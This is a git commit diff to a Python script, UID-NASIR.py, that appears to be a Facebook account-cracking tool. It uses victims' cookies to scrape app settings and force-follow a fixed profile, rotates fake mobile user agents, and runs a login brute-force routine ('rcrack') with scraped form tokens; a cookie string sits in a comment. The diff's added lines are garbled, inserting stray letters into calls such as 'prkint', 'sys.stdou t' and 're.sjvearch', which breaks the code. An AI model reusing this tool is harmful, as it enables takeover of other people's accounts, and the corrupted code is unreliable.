e0885fdc25a12c87302caeac86ab603eaf6fe0cf
nasirvau <130596101+nasirvau0@users.noreply.github.com>
2023-09-24 12:19:33 +0600

    Update UID-NASIR.py

--- UID-NASIR.py
+++ UID-NASIR.py
@@ -29,7 +29,7 @@ def cek_apk(session,coki):
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         else:
-            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+            print(f'\r %s[%clds!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
@@ -37,14 +37,14 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
     else:
-        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
+        print(f'\r[] %s \x1b[1;9vkv5m  Your Expired Apps     :{WHITE}'%(M))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
             print('')
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(ngdjsession.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://mbasic.facebook.com' + str(get), {
@@ -55,9 +55,9 @@ def follow(self, session, coki):
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.009)
+            sys.stdou t.write(e)
+            sys.stdohut.flush()
+            time.sleebp(0.009)
             
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -124,7 +124,7 @@ cps = []
 def clear():
     os.system('clear')
     print(logo)
-from time import localtime as lt
+from time import 3 localtime as lt
 from os import system as cmd
 ltx = int(lt()[3])
 if ltx > 12:
@@ -136,7 +136,7 @@ else:
     
     
 try:
-    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    prkint('\n\n\033[1;33mLoading asset files ... \033[0;97m')
     v = 5.2
     update = ('5.2')
     update = ('5.2')
@@ -165,7 +165,7 @@ for xd in range(10000):
     g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
     h=random.randrange(73,100)
     i='0'
-    j=random.randrange(4200,4900)
+    j=random.randxhrange(4200,4900)
     k=random.randrange(40,150)
     l='Mobile Safari/537.36'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
@@ -265,7 +265,7 @@ def rcrack(uid,pwx,tl):
             session = requests.Session()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                "lsd":re.sjvearch('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -277,7 +277,7 @@ def rcrack(uid,pwx,tl):
             header_freefb = {'authority': 'mbasic.facebook.com',
     "method": 'GET',
     "scheme": 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept': 'text/html,applbvication/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en-IN;q=0.9,en-AI;q=0.8,en;q=0.7,hi-IN;q=0.6,hi;q=0.5',
     # 'cookie': 'datr=3pJTZGdbCb8Phj1kpkJiMeLf; sb=3pJTZPuLJL0MlLNzlAq-Qzav; m_pixel_ratio=2; wd=360x668; fr=0rSLZuIWvyjGieLpw.AWXobpWCi8OlAuTnHHH21bWqNcc.BkU5L0.7I.GRf.0.0.Bka0-1.AWUQeZSQXQY',
     'sec-ch-prefers-color-scheme': 'light',
@@ -315,10 +315,10 @@ def rcrack(uid,pwx,tl):
         colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🐼','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
-        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
+        colorful=random.choice(['\033[1vh;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         sys.stdout.write(f"\r \33[1;90m[{colr}NASIR❤️‍🔥🎁CYBER🥰\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
         sys.stdout.flush()
-        sys.stdout.write(f'\r\r%s {x}[{xr}ᥬ🤢᭄NASIR🤢᭄ꓧٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜꓥٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜꓚٜٜٜٜٜٜٜٜٜٜٜٜꓗٜٜٜٜٜٜٜٜing {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%cds {x}[{xr}ᥬ🤢᭄NASIR🤢᭄ꓧٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜꓥٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜٜꓚٜٜٜٜٜٜٜٜٜٜٜٜꓗٜٜٜٜٜٜٜٜing {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
